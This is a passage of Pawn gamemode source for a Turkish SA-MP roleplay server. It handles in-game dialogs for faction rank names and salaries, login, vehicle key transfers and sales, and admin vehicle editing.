	        if(listitem == 1)
	        {
				ShowPlayerDialog(playerid, 3022, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Nakliye Sistemi", "Þarap satýn almak istediðinize emin misiniz?\nKaç adet satýn almak istiyorsunuz?\nBu iþlemin geri dönüþü olmayacaktýr.", "Satýn Al", "Kapat");
	        }
	        if(listitem == 2)
	        {
				ShowPlayerDialog(playerid, 3022, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Nakliye Sistemi", "Viski satýn almak istediðinize emin misiniz?\nKaç adet satýn almak istiyorsunuz?\nBu iþlemin geri dönüþü olmayacaktýr.", "Satýn Al", "Kapat");
	        }
	        if(listitem == 3)
	        {
				ShowPlayerDialog(playerid, 3022, DIALOG_STYLE_INPUT, ""C7"EIGHTBORN - "C8"Nakliye Sistemi", "Sprunk satýn almak istediðinize emin misiniz?\nKaç adet satýn almak istiyorsunuz?\nBu iþlemin geri dönüþü olmayacaktýr.", "Satýn Al", "Kapat");
	        }
	    }
	}
	if(dialogid == 3000)
	{
	    if(response)
		{
		    new str[1024];
			switch(listitem)
			{
			    case 0:
			    {
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe1]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe2]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe3]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe4]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe5]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe6]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe7]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe8]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe9]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe10]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe11]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe12]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe13]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe14]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe15]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe16]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe17]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe18]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe19]);
			        strcat(str, "\n");
			        strcat(str, Birlik[Karakter[playerid][birlik]][rutbe20]);
			        ShowPlayerDialog(playerid, 3001, DIALOG_STYLE_LIST, "Rütbe Ýsim Ayarla", str, "Ayarla", "Ýptal");
			    }
			    case 1:
			    {
			        format(str, 1024, "%s\t%d\n",Birlik[Karakter[playerid][birlik]][rutbe1],Birlik[Karakter[playerid][birlik]][rutbe1maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe2],Birlik[Karakter[playerid][birlik]][rutbe2maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe3],Birlik[Karakter[playerid][birlik]][rutbe3maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe4],Birlik[Karakter[playerid][birlik]][rutbe4maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe5],Birlik[Karakter[playerid][birlik]][rutbe5maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe6],Birlik[Karakter[playerid][birlik]][rutbe6maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe7],Birlik[Karakter[playerid][birlik]][rutbe7maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe8],Birlik[Karakter[playerid][birlik]][rutbe8maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe9],Birlik[Karakter[playerid][birlik]][rutbe9maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe10],Birlik[Karakter[playerid][birlik]][rutbe10maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe11],Birlik[Karakter[playerid][birlik]][rutbe11maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe12],Birlik[Karakter[playerid][birlik]][rutbe12maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe13],Birlik[Karakter[playerid][birlik]][rutbe13maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe14],Birlik[Karakter[playerid][birlik]][rutbe14maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe15],Birlik[Karakter[playerid][birlik]][rutbe15maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe16],Birlik[Karakter[playerid][birlik]][rutbe16maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe17],Birlik[Karakter[playerid][birlik]][rutbe17maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe18],Birlik[Karakter[playerid][birlik]][rutbe18maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe19],Birlik[Karakter[playerid][birlik]][rutbe19maas]);
			        format(str, 1024, "%s%s\t%d\n",str, Birlik[Karakter[playerid][birlik]][rutbe20],Birlik[Karakter[playerid][birlik]][rutbe20maas]);
			        ShowPlayerDialog(playerid, 3003, DIALOG_STYLE_TABLIST, "Rütbe Maaþ Ayarla", str, "Ayarla", "Ýptal");
			    }
			    case 2:
			    {
					ShowPlayerDialog(playerid, 165, DIALOG_STYLE_INPUT, "Oluþumu Yeniden Adlandýr", "Yeni oluþum ismini giriniz:", "Tamam", "Vazgeç");
			    }
				case 3:
				{
					ShowPlayerDialog(playerid, 166, DIALOG_STYLE_INPUT, "Oluþum Tipi", "Yeni oluþum tipini giriniz:", "Tamam", "Vazgeç");
				}
				case 4:
				{
				    new Float:pPos[3],pVw,pInt,_bid=Karakter[playerid][birlik];
				    GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
				    pVw = GetPlayerVirtualWorld(playerid);
				    pInt = GetPlayerInterior(playerid);
				    Birlik[_bid][bisbasix] = pPos[0];
				    Birlik[_bid][bisbasiy] = pPos[1];
					Birlik[_bid][bisbasiz] = pPos[2];
					Birlik[_bid][bisbasivw] = pVw;
					Birlik[_bid][bisbasiint] = pInt;
					Bilgi(playerid, "Birliðin iþbaþý pozisyonu düzenlendi.");
					BirlikKaydet(_bid);
				}
				case 5:
				{
				    new Float:pPos[3],pVw,pInt,_bid=Karakter[playerid][birlik];
				    GetPlayerPos(playerid, pPos[0], pPos[1], pPos[2]);
				    pVw = GetPlayerVirtualWorld(playerid);
				    pInt = GetPlayerInterior(playerid);
				    Birlik[_bid][breklamx] = pPos[0];
				    Birlik[_bid][breklamy] = pPos[1];
					Birlik[_bid][breklamz] = pPos[2];
					Birlik[_bid][breklamvw] = pVw;
					Birlik[_bid][breklamint] = pInt;
					Bilgi(playerid, "Birliðin reklam pozisyonu düzenlendi.");
					BirlikKaydet(_bid);
				}
			}
	    }
	    return 1;
	}
	if(dialogid == 3001)
	{
	    if(response)
		{
		    new str[256];
		    switch(listitem)
			{
		    	case 0:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe1]);
		    	case 1:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe2]);
		    	case 2:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe3]);
		    	case 3:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe4]);
		    	case 4:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe5]);
		    	case 5:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe6]);
		    	case 6:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe7]);
		    	case 7:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe8]);
		    	case 8:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe9]);
		    	case 9:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe10]);
		    	case 10:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe11]);
		    	case 11:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe12]);
		    	case 12:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe13]);
		    	case 13:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe14]);
		    	case 14:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe15]);
		    	case 15:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe16]);
		    	case 16:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe17]);
		    	case 17:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe18]);
		    	case 18:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe19]);
		    	case 19:format(str, 256, "Rütbe '%s', Yeni ismini girin:",Birlik[Karakter[playerid][birlik]][rutbe20]);
			}
			SetPVarInt(playerid, "MG_Secili_Rutbe", listitem);
			ShowPlayerDialog(playerid, 3002, DIALOG_STYLE_INPUT, "Rütbe Ýsim Ayarla", str, "Ayarla", "Ýptal");
			BirlikKaydet(Karakter[playerid][birlik]);
			return 1;
		}
	}
	if(dialogid == 3002)
	{
	    if(response)
		{
		    new str[256];
		    switch(GetPVarInt(playerid, "MG_Secili_Rutbe"))
			{
		    	case 0:format(Birlik[Karakter[playerid][birlik]][rutbe1], 50, inputtext);
		    	case 1:format(Birlik[Karakter[playerid][birlik]][rutbe2], 50, inputtext);
		    	case 2:format(Birlik[Karakter[playerid][birlik]][rutbe3], 50, inputtext);
		    	case 3:format(Birlik[Karakter[playerid][birlik]][rutbe4], 50, inputtext);
		    	case 4:format(Birlik[Karakter[playerid][birlik]][rutbe5], 50, inputtext);
		    	case 5:format(Birlik[Karakter[playerid][birlik]][rutbe6], 50, inputtext);
		    	case 6:format(Birlik[Karakter[playerid][birlik]][rutbe7], 50, inputtext);
		    	case 7:format(Birlik[Karakter[playerid][birlik]][rutbe8], 50, inputtext);
		    	case 8:format(Birlik[Karakter[playerid][birlik]][rutbe9], 50, inputtext);
		    	case 9:format(Birlik[Karakter[playerid][birlik]][rutbe10], 50, inputtext);
		    	case 10:format(Birlik[Karakter[playerid][birlik]][rutbe11], 50, inputtext);
		    	case 11:format(Birlik[Karakter[playerid][birlik]][rutbe12], 50, inputtext);
		    	case 12:format(Birlik[Karakter[playerid][birlik]][rutbe13], 50, inputtext);
		    	case 13:format(Birlik[Karakter[playerid][birlik]][rutbe14], 50, inputtext);
		    	case 14:format(Birlik[Karakter[playerid][birlik]][rutbe15], 50, inputtext);
		    	case 15:format(Birlik[Karakter[playerid][birlik]][rutbe16], 50, inputtext);
		    	case 16:format(Birlik[Karakter[playerid][birlik]][rutbe17], 50, inputtext);
		    	case 17:format(Birlik[Karakter[playerid][birlik]][rutbe18], 50, inputtext);
		    	case 18:format(Birlik[Karakter[playerid][birlik]][rutbe19], 50, inputtext);
		    	case 19:format(Birlik[Karakter[playerid][birlik]][rutbe20], 50, inputtext);
			}
			format(str, 256, "Rütbe ismi '%s' olarak deðiþtirildi.",inputtext);
			SendClientMessage(playerid, -1, str);
			BirlikKaydet(Karakter[playerid][birlik]);
			return 1;
		}
	}
	if(dialogid == 3003)
	{
	    if(response)
		{
		    new str[256];
		    switch(listitem)
			{
		    	case 0:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe1]);
		    	case 1:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe2]);
		    	case 2:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe3]);
		    	case 3:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe4]);
		    	case 4:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe5]);
		    	case 5:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe6]);
		    	case 6:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe7]);
		    	case 7:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe8]);
		    	case 8:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe9]);
		    	case 9:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe10]);
		    	case 10:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe11]);
		    	case 11:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe12]);
		    	case 12:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe13]);
		    	case 13:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe14]);
      		 	case 14:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe15]);
                case 15:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe16]);
                case 16:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe17]);
                case 17:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe18]);
                case 18:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe19]);
                case 19:format(str, 256, "Rütbe '%s', Yeni maaþý girin:",Birlik[Karakter[playerid][birlik]][rutbe20]);
			}
			SetPVarInt(playerid, "MG_Secili_Rutbe", listitem);
			ShowPlayerDialog(playerid, 3004, DIALOG_STYLE_INPUT, "Rütbe Maaþ Ayarla", str, "Ayarla", "Ýptal");
			BirlikKaydet(Karakter[playerid][birlik]);
			return 1;
		}
	}
	if(dialogid == 3004)
	{
	    if(response)
		{
		    if(!IsNumeric(inputtext))
			{
				return ShowPlayerDialog(playerid, 3004, DIALOG_STYLE_LIST, "Rütbe Maaþ Ayarla", "Rakam olmalýdýr:", "Ayarla", "Ýptal");
			}
		    new str[256];
		    switch(GetPVarInt(playerid, "MG_Secili_Rutbe"))
			{
		    	case 0:Birlik[Karakter[playerid][birlik]][rutbe1maas] = strval(inputtext);
		    	case 1:Birlik[Karakter[playerid][birlik]][rutbe2maas] = strval(inputtext);
		    	case 2:Birlik[Karakter[playerid][birlik]][rutbe3maas] = strval(inputtext);
		    	case 3:Birlik[Karakter[playerid][birlik]][rutbe4maas] = strval(inputtext);
		    	case 4:Birlik[Karakter[playerid][birlik]][rutbe5maas] = strval(inputtext);
		    	case 5:Birlik[Karakter[playerid][birlik]][rutbe6maas] = strval(inputtext);
		    	case 6:Birlik[Karakter[playerid][birlik]][rutbe7maas] = strval(inputtext);
		    	case 7:Birlik[Karakter[playerid][birlik]][rutbe8maas] = strval(inputtext);
		    	case 8:Birlik[Karakter[playerid][birlik]][rutbe9maas] = strval(inputtext);
		    	case 9:Birlik[Karakter[playerid][birlik]][rutbe10maas] = strval(inputtext);
		    	case 10:Birlik[Karakter[playerid][birlik]][rutbe11maas] = strval(inputtext);
		    	case 11:Birlik[Karakter[playerid][birlik]][rutbe12maas] = strval(inputtext);
		    	case 12:Birlik[Karakter[playerid][birlik]][rutbe13maas] = strval(inputtext);
		    	case 13:Birlik[Karakter[playerid][birlik]][rutbe14maas] = strval(inputtext);
		    	case 14:Birlik[Karakter[playerid][birlik]][rutbe15maas] = strval(inputtext);
		    	case 15:Birlik[Karakter[playerid][birlik]][rutbe16maas] = strval(inputtext);
		    	case 16:Birlik[Karakter[playerid][birlik]][rutbe17maas] = strval(inputtext);
		    	case 17:Birlik[Karakter[playerid][birlik]][rutbe18maas] = strval(inputtext);
		    	case 18:Birlik[Karakter[playerid][birlik]][rutbe19maas] = strval(inputtext);
		    	case 19:Birlik[Karakter[playerid][birlik]][rutbe20maas] = strval(inputtext);
			}
			format(str, 256, "Rütbe maaþý '%d$' olarak deðiþtirildi.",strval(inputtext));
			SendClientMessage(playerid, -1, str);
			BirlikKaydet(Karakter[playerid][birlik]);
			return 1;
		}
	}
	if(dialogid == 3005)
	{
		new yazanamyaz[256];
	    if(response)
	    {
	        SetPlayerCameraPos(playerid, 2000, -2000, 2000);
	        SetPlayerCameraLookAt(playerid, 2000, -2000, 2000);
	        format(yazanamyaz, sizeof(yazanamyaz), "%s adlý oyuncu teklifinizi kabul etti.",OyuncuAdiniBul(playerid));
	        Bilgi(GozBaglayan[playerid], yazanamyaz);
	        GozBaglandi[playerid] = 1;
	    }
	    else
	    {
	        format(yazanamyaz, sizeof(yazanamyaz), "%s adlý oyuncu teklifinizi reddetti.", OyuncuAdiniBul(playerid));
			Hata(GozBaglayan[playerid], yazanamyaz);
	    }
	}
	if(dialogid == 3006)
	{
	    if(response)
	    {
			Karakter[playerid][suruklenen] = Karakter[playerid][surukleyen];
	        Bilgi(Karakter[playerid][surukleyen], "Sürükleme teklifiniz kabul edildi.");
	        Bilgi(playerid, "Sürükleme teklifini kabul ettiniz.");
	        DONDUR(playerid);
	    }
	    else
	    {
	        Bilgi(playerid, "Sürükleme teklifini reddettiniz.");
	        Hata(Karakter[playerid][surukleyen], "Sürükleme teklifiniz reddedildi.");
	        Karakter[Karakter[playerid][surukleyen]][surukleyen] = -1;
	        Karakter[playerid][surukleyen] = -1;
	    }
	}
	if(dialogid == 1)
	{
		if(response)
		{
		    if(Buysa(Karakter[playerid][sifre],MD5_Hash(inputtext))) {
                new mquery[1024];
				format(mquery, sizeof(mquery), "SELECT * FROM `karakterler` WHERE `id` = '%d' LIMIT 1", Karakter[playerid][sqlid]);
				mysql_function_query(g_iHandle, mquery, true, "OnQueryFinished", "dd", playerid, 1);
			}
		    else
			{
				ShowPlayerDialog(playerid, 1, DIALOG_STYLE_PASSWORD, ""C7"EIGHTBORN - "C8"Giriþ", "{FFFFFF}Hatalý bir þifre girdiniz!\nKarakteriniz sistem tarafýndan veritabanýnda kayýtlý olarak algýlandý.\n60 saniye içerisinde giriþ yapmazsanýz otomatik olarak atýlacaksýnýz.\nGiriþ yapabilmek için lütfen þifrenizi giriniz.", "Giriþ", "Çýkýþ");
			//	ShowPlayerDialog(playerid, 1, DIALOG_STYLE_PASSWORD, ""SDIALOG"", "Hatalý bir þifre girdiniz.\nÜç hatalý giriþ yaptýðýnýz taktirde oyundan atýlacaksýnýz.\nSunucuya giriþ yapmak için lütfen þifrenizi giriniz.", "Giriþ", "Çýkýþ");
				girishakki[playerid]++;
			}
		    if(girishakki[playerid] == 3) Kick(playerid);
		}
		else Kick(playerid);
	}
	if(dialogid == 2)
	{
	    if(response)
	    {
	        new vid = GetPVarInt(playerid, "TeklifArac");
	        AracAnahtarVer(playerid, vid);
			new string[128];
			format(string, sizeof(string), "%s'nin yedek anahtarýný aldýnýz.", OyuncuAdiniBul(GetPVarInt(playerid, "TeklifAracVeren")));
			Bilgi(playerid, string);
			format(string, sizeof(string), "%s'e aracýnýzýn yedek anahtarýný verdiniz.", OyuncuAdiniBul(playerid));
			Bilgi(GetPVarInt(playerid, "TeklifAracVeren"), string);
			KarakterKaydet(playerid);
		}
		else Hata(GetPVarInt(playerid, "TeklifAracVeren"), "Yedek anahtar vermek istediðiniz kiþi teklifi reddetti.");
		DeletePVar(playerid, "TeklifArac");
		DeletePVar(playerid, "TeklifAracVeren");
		return 1;
	}
	if(dialogid == 3)
	{
	    new string[128];
	    new sataneleman = GetPVarInt(playerid, "AracTeklifVeren");
	    new vid = GetPVarInt(playerid, "AracTeklifArac");
	    new fiyat = GetPVarInt(playerid, "AracTeklifFiyat");
	    if(response)
	    {
			if(!IsPlayerConnected(sataneleman))
			{
			    SetPVarInt(playerid, "AracTeklifEdiyor", 0);
			    Bilgi(playerid, "Aracý satmak istediðiniz kiþi oyundan çýktý.");
			    return 1;
			}
	        if(GetPlayerCash(playerid) >= fiyat)
			{
			    if(Arac[vid][aowner] != Karakter[sataneleman][sqlid]) return Hata(sataneleman, "Araç üzerinize kayýtlý deðil.");
			    Arac[vid][aowner] = Karakter[playerid][sqlid];
				format(string, sizeof(string), "Aracý %s isimli kiþiden %d$ karþýlýðýnda satýn aldýnýz.", OyuncuAdiniBul(sataneleman), fiyat);
				Bilgi(playerid, string);
				format(string, sizeof(string), "Aracý %s isimli kiþiye %d$ karþýlýðýnda sattýnýz.", OyuncuAdiniBul(playerid), fiyat);
				Bilgi(sataneleman, string);
				GivePlayerCash(playerid, -fiyat);
				GivePlayerCash(sataneleman, fiyat);
				AracAnahtarTumSil(vid);
				AracKaydet(vid);
				KarakterKaydet(playerid);
				KarakterKaydet(sataneleman);
			}
			else
			{
			    Hata(playerid, "Bu aracý satýn alabilmek için yeterli miktarda paranýz yok.");
			    Bilgi(sataneleman, "Aracý satmak istediðiniz kiþinin yeterli parasý yok.");
			    return 1;
			}
	    }
	    else
	    {
	        Bilgi(sataneleman, "Aracý satmak istediðiniz kiþi teklifi reddetti.");
	        SetPVarInt(playerid, "AracTeklifEdiyor", 0);
	        return 1;
 		}
		return 1;
	}
	if(dialogid == 4)
	{
		if(response)
		{
		    new tmpcar = GetClosestVehicle(playerid);
		    new log[256];
			if(tmpcar == 0)
			{
			    return 1;
			}
		    if(listitem == 0)
		    {
		        ShowPlayerDialog(playerid, 5, DIALOG_STYLE_INPUT, "Araç sahibini düzenleyin!", "Eski araç sahibi loglara kaydedildi.\nYeni araç sahibinin SQLID deðerini girin:", "Onayla", "Kapat");
			}
			if(listitem == 1)
			{
			    if(IsPlayerInAnyVehicle(playerid))
			    {
		        	ShowPlayerDialog(playerid, 6, DIALOG_STYLE_INPUT, "Araç modelini düzenleyin!", "Eski araç modeli loglara kaydedildi.\nYeni araç modelinin ID deðerini girin:", "Onayla", "Kapat");
					MotoruKapat(tmpcar);
				}
				else Hata(playerid, "Bu iþlemi gerçekleþtirebilmek için araç içerisinde olmalýsýnýz.");
			}
			if(listitem == 2)
			{
   				ShowPlayerDialog(playerid, 7, DIALOG_STYLE_INPUT, "Araç plakasýný düzenleyin!", "Eski araç plakasý loglara kaydedildi.\nYeni araç plakasýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 3)
			{
   				ShowPlayerDialog(playerid, 8, DIALOG_STYLE_INPUT, "Araç fiyatýný düzenleyin!", "Eski araç fiyatý loglara kaydedildi.\nYeni araç fiyatýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 4)
			{
   				ShowPlayerDialog(playerid, 9, DIALOG_STYLE_INPUT, "Araç renk1i düzenleyin!", "Eski araç renk1 loglara kaydedildi.\nYeni araç renk1 girin:", "Onayla", "Kapat");
			}
			if(listitem == 5)
			{
   				ShowPlayerDialog(playerid, 10, DIALOG_STYLE_INPUT, "Araç renk2i düzenleyin!", "Eski araç renk2 loglara kaydedildi.\nYeni araç renk2 girin:", "Onayla", "Kapat");
			}
			if(listitem == 6)
			{
   				ShowPlayerDialog(playerid, 11, DIALOG_STYLE_INPUT, "Araç benzin deðerini düzenleyin!", "Eski araç benzin deðeri loglara kaydedildi.\nYeni araç benzin deðerini girin:", "Onayla", "Kapat");
			}
			if(listitem == 7)
			{
   				ShowPlayerDialog(playerid, 12, DIALOG_STYLE_INPUT, "Araç hasar deðerini düzenleyin!", "Eski araç hasar deðeri loglara kaydedildi.\nYeni araç hasar deðerini girin:", "Onayla", "Kapat");
			}
			if(listitem == 8)
			{
			    if(IsPlayerInAnyVehicle(playerid))
			    {
					new Float:X,Float:Y,Float:Z,Float:ANGLE,VW,INT, model2;
					GetVehiclePos(tmpcar,X,Y,Z);
					GetVehicleZAngle(tmpcar,ANGLE);
					model2 = GetVehicleModel(tmpcar);
					VW = GetVehicleVirtualWorld(tmpcar);
					INT = GetPlayerInterior(playerid);
					DestroyVehicle(tmpcar);
					AddStaticVehicleEx(model2,X,Y,Z,ANGLE,0,0,0);
					LinkVehicleToInterior(tmpcar, INT);
					SetVehicleVirtualWorld(tmpcar,VW);
					AracModifiyeleri[Arac[tmpcar][aid]][ModPaintjob] = 0;
					AracModifiyeleri[Arac[tmpcar][aid]][ModSpoiler] = 0;
					AracModifiyeleri[Arac[tmpcar][aid]][ModRoof] = 0;
					AracModifiyeleri[Arac[tmpcar][aid]][ModLeftSideSkirt] = 0;
					AracModifiyeleri[Arac[tmpcar][aid]][ModRightSideSkirt] = 0;
					AracModifiyeleri[Arac[tmpcar][aid]][ModExhaust] = 0;
					AracModifiyeleri[Arac[tmpcar][aid]][ModWheels] = 0;
					AracModifiyeleri[Arac[tmpcar][aid]][ModFrontBumper] = 0;
					AracModifiyeleri[Arac[tmpcar][aid]][ModRearBumper] = 0;
					AracModifiyeleri[Arac[tmpcar][aid]][ModStereo]  = 0;
					AracModifiyeleri[Arac[tmpcar][aid]][ModHydraulics] = 0;
					AracModifiyeleri[Arac[tmpcar][aid]][ModNitro] = 0;
					BilgileriKaydet(tmpcar);
					Bilgi(playerid, "Araç modifiyeleri baþarýyla silindi.");
					format(log, sizeof(log), "[/aduzenle - /aracduzenle] %d idli aracin modifiyelerini sildi.", tmpcar);
					Log(playerid, log);
				}
				else Hata(playerid, "Araç içerisinde deðilsiniz.");
			}
			if(listitem == 9)
			{
   				ShowPlayerDialog(playerid, 9832, DIALOG_STYLE_INPUT, "Araç tampon yazýsýný düzenleyin!", "Tampon yazýsýný silmek istiyorsanýz dialogu boþ býrakýn.\nTampon yazýsýný girin:", "Onayla", "Kapat");
			}
			if(listitem == 10)
			{
   				ShowPlayerDialog(playerid, 9833, DIALOG_STYLE_INPUT, "Araç tipini düzenleyin!", "Araç tipini girin:", "Onayla", "Kapat");
			}
			if(listitem == 11)
			{
   				ShowPlayerDialog(playerid, 9834, DIALOG_STYLE_INPUT, "Araç kilometresini düzenleyin!", "Araç kilometresi girin:", "Onayla", "Kapat");
			}
			if(listitem == 12)
			{
   				ShowPlayerDialog(playerid, 9835, DIALOG_STYLE_INPUT, "Araç iþyerini düzenleyin!", "Ýþyeri ID girin:", "Onayla", "Kapat");
			}
			if(listitem == 13)
			{
   				ShowPlayerDialog(playerid, 9836, DIALOG_STYLE_INPUT, "Araç vergisini düzenleyin!", "Araç vergisini girin:", "Onayla", "Kapat");
			}
			if(listitem == 14)
			{
   				ShowPlayerDialog(playerid, 9837, DIALOG_STYLE_INPUT, "Araç sigortasýný düzenleyin!", "Araç sigortasýný girin:", "Onayla", "Kapat");
			}
		}
		return 1;
	}
	if(dialogid == 9837)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
	        new sahip = strval(inputtext);
	        new string[128];
	        new tmpcar = GetClosestVehicle(playerid);
	        if(tmpcar == 0)
	        {
	            return 1;
			}
	        Arac[tmpcar][sigorta] = sahip;
	        AracKaydet(tmpcar);
	        format(string, sizeof(string), "Araç bilgileri ve log dosyasý kaydedildi! Yeni araç sigortasý: %d olarak deðiþtirildi.",sahip);
	        Bilgi(playerid, string);
			format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin sigortasýný %d olarak degistirdi.", tmpcar, sahip);
			Log(playerid, string);
		}
		return 1;
	}
	if(dialogid == 9836)
	{
	    if(response)
	    {
	        if(!strlen(inputtext))
	        {
	            return 1;
			}
	        new sahip = strval(inputtext);
	        new string[128];
	        new tmpcar = GetClosestVehicle(playerid);
	        if(tmpcar == 0)
	        {
	            return 1;
			}
	        Arac[tmpcar][vergi] = sahip;
	        AracKaydet(tmpcar);
	        format(string, sizeof(string), "Araç bilgileri ve log dosyasý kaydedildi! Yeni araç vergisi: %d olarak deðiþtirildi.",sahip);
	        Bilgi(playerid, string);
			format(string, sizeof(string), "[/aduzenle - /aracduzenle] %d idli aracin vergisini %d olarak degistirdi.", tmpcar, sahip);
			Log(playerid, string);
		}
		return 1;
	}
	if(dialogid == 9835)
	{
	    if(response)
